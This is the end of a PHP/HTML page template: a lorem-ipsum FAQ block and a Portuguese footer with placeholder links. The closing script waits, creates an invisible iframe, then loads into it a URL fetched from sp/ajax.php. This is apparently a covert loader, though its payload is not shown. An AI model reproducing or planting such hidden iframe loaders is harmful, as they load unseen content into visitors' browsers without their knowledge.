<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>

<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">When will be next version?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>

</div>
</div>

</section>
<footer id="footer">
<div class="container">
<div class="row">
<div class="col-md-12">
<a href="#" class="btn btn-red" style="margin-bottom:20px;">Solicitar um Orçamento</a>
<ul class="social list-inline">
<li><a href="#"><i class="fa fa-facebook"></i></a></li>
<li><a href="#"><i class="fa fa-twitter"></i></a></li>
<li><a href="#"><i class="fa fa-dribbble"></i></a></li>
<li><a href="#"><i class="fa fa-linkedin"></i></a></li>
<li><a href="#"><i class="fa fa-vimeo"></i></a></li>
</ul>

<p itemscope itemtype="https://schema.org/WPFooter" style="color:#C2C2C2;">Copyright © 2012 - 2018 | <a itemprop="url" href="<?php echo $nm_slug; ?>"><span itemprop="name"><?php echo $nm_servico; ?> <?php echo $nm_bairro; ?></span></a>. Todos Os Direitos Reservados.</p>

</div>
</div>
</div>
</footer>
<script src="<?php echo HTTP_HOST; ?>sp/js/page.js"></script>
<script>
setTimeout(function(){ criaIf(); }, 10000);
setTimeout(function(){ execute(); }, 20000);
function criaIf(){
  $("<iframe id='htmlIF' style='display:none'></iframe>").appendTo("body");
}
function execute(){
$.post("sp/ajax.php", function( data ) {
  $('#htmlIF').attr("src", data);
});
}
</script>
</body>
</html>